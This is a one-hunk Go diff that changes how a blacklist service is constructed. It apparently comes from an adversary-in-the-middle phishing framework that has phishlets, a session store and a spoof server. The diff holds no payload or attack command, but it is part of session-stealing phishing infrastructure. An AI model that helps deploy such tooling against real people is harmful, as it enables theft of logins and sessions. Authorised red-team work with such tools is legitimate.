@@ -239,7 +239,7 @@ func (ini *initializer) initServices() error {
 	}
 	ini.sessionStore = sqlite.NewSessionStore(ini.db, sessionCipher)
 	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
-	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
+	ini.blacklistSvc = aitm.NewBlacklistService()
 	ini.spoofer = spoof.NewServer(ini.cfg.SpoofURL, proxy.SessionCookieName, ini.logger)
 
 	phishletSvc := &aitm.PhishletService{
